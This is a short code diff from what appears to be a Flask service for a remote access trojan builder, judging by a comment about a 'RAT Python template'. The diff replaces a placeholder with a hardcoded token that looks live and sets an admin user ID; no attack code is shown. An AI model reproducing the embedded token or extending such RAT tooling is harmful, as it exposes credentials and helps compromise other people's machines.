@@ -27,7 +27,7 @@ import time
 app = Flask(__name__)
 
 # Your admin credentials (hidden from users)
-MASTER_TOKEN = "YOUR_MASTER_TOKEN_HERE"
+MASTER_TOKEN = "MTQ1NDc5MDI1Mzg1OTgzNjAwMA.G6dILv.u2PYhrB4aJquSf8XDHCkHDOT-Qgik8RztGjNLQ"
 ADMIN_USER_ID = 1445252686751469679
 
 # RAT Python template with DualHook
